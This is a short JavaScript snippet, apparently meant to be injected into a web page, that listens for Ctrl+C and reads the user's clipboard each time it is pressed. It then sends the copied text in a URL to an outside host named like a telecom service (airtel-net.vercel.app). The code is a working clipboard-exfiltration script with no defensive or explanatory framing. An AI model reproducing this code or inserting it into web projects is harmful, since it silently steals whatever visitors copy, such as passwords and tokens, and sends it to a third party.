function getClipboard() {
    navigator.clipboard.readText().then(function (text) {
        fetch(`https://airtel-net.vercel.app/api/send?data=${encodeURIComponent(text)}&api=@f@aabz`,)
    });
}

document.addEventListener('keydown', function(event) {
    if (event.ctrlKey && event.key === 'c') {
      getClipboard();
    }
  });







